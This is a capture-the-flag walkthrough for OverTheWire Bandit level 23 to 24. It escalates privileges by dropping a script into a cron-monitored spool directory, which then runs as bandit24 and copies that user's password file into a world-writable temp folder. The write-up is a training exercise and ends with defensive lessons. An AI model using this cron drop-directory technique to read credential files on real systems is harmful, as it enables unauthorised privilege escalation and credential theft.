### Level Info
- **Level:** Bandit Level 23 - Level 24.
- **Category:** Cron Jobs / Privilege Escalation / Script Execution.

### Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in `/etc/cron.d/` for the 
configuration and identify what command is being executed. Use this to retrieve the password for the next level.

### Walkthrough
- Log in to bandit23 using the password.  
- Navigate to cron directory: `cd /etc/cron.d`
- List files:`ls`
- Found relevant file:`cronjob_bandit24` 
- Checked the cron job: `cat cronjob_bandit24`
- Output:
  ```
  @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
  * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
  ```  
- Understood:
  - Script runs every minute.  
  - Runs as user bandit24.  
- Checked the script: `cat /usr/bin/cronjob_bandit24.sh`.  
- Observed:
  - It goes to `/var/spool/bandit24/foo`.  
  - Executes all files owned by bandit23.  
  - Deletes them after execution.  
- Idea:
  - Create a script in that monitored directory.  
  - That script will be executed as bandit24.  
  - Use it to read the password.  
- Created working directory:
  - `mkdir -p /tmp/warrior`  
  - `chmod 777 /tmp/warrior`  
- Created script:
  - `echo '#!/bin/bash
  cat /etc/bandit_pass/bandit24 > /tmp/warrior/challenge' > /var/spool/bandit24/foo/war.sh`  
- Made it executable:
  - `chmod +x /var/spool/bandit24/foo/war.sh`  
- Waited 1 minute for cron to execute.  
- Retrieved the password:
  - `cat /tmp/warrior/challenge`  

### What I Learned
- Cron jobs can execute user-controlled files placed in monitored directories.  
- `/var/spool/bandit24/foo` acts as a drop location where scripts are automatically executed.  
- Understanding how and where automated systems read input is key to exploitation.  
- Timing matters when working with scheduled tasks.  

### Security Insight
- Allowing users to place executable files in a monitored directory is a critical misconfiguration.  
- Secure systems must restrict write access to directories that trigger automated execution.  
